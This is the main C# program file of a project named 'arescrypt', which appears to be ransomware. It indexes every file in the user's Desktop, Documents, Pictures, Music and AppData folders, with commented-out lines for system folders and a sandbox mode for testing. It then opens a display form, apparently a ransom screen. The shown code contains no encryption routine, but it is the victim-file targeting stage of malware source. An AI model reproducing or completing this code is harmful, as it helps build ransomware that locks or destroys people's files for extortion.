using System;
using System.IO;
using System.Reflection;
using System.Windows.Forms;
using System.Collections.Generic;

namespace arescrypt
{
    class Program
    {
        // Predefinitions
        public static string sessionDomain = Environment.UserDomainName; // get current sessions domain
        public static string sessionUsername = Environment.UserName; // get current sessions username
        static Configuration config = new Configuration(); // New instance of Configuration class

        static void Main(string[] args)
        {
            // Welcome message
            Console.Write("Hello, " + sessionDomain + @"\" + sessionUsername);
#if DEBUG
            Console.Write(". DEBUG mode has been enabled.\n");
#else
            Console.Write(". RELEASE mode has been enabled.\n");
#endif
            Console.WriteLine("Current path is: " + Configuration.currentWorkingDirectory + "\n");
            // End welcome message

            var userSpecificDirs = new List<string> { "" };
            var systemSpecificDirs = new List<string> { "" };
            string[] fullFileIndex = { "" };

            if (config.sandBox) // == true
                if (Directory.Exists(config.sandBoxDirectory))
                    userSpecificDirs.Add(config.sandBoxDirectory);
                else
                    Console.WriteLine("Sandbox mode was enabled, but no sandbox directory was discovered.\nPlease create this directory: " + config.sandBoxDirectory);
            else if (!config.sandBox)
            {
                //*
                // User specific directories, administrative rights shouldn't be required in order to write to these files
                userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
                userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));
                userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
                userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
                userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));

                // System specific directories, administrative rights may be required in order to write to these files
                //systemSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles));
                //systemSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86));
                //systemSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.System));
                //*/
            }
            
            var userSpecificFiles = new List<string> { };
            var systemSpecificFiles = new List<string> { };

            foreach (string dir in userSpecificDirs)
                foreach (string file in FileHandler.DirSearch(dir))
                    userSpecificFiles.Add(file);
            if (config.sandBox) // == true
                fullFileIndex = userSpecificFiles.ToArray();
            else if (!config.sandBox) // == false
            {   // Get file index from both Lists' and spawn a Full File Index of all files in every subdirectory
                foreach (string dir in systemSpecificDirs)
                    foreach (string file in FileHandler.DirSearch(dir))
                        systemSpecificFiles.Add(file);
                fullFileIndex = Misc.concatList(userSpecificFiles, systemSpecificFiles).ToArray();
            }

            foreach (string file in fullFileIndex)
                Console.WriteLine(file);
                        
            if (config.debugMode) // == true
            {
                // Exiting message
                Console.Write("\nPress any key to continue . . . ");

                try { Console.ReadKey(); } // Hang the console
                catch (Exception) { } // Because Mintty doesn't like to "ReadKeys"
            }
            else if (!config.debugMode) // == false
            {
                Application.EnableVisualStyles();
                Application.SetCompatibleTextRenderingDefault(false);
                Application.Run(new Display());
            }
        }
    }
}
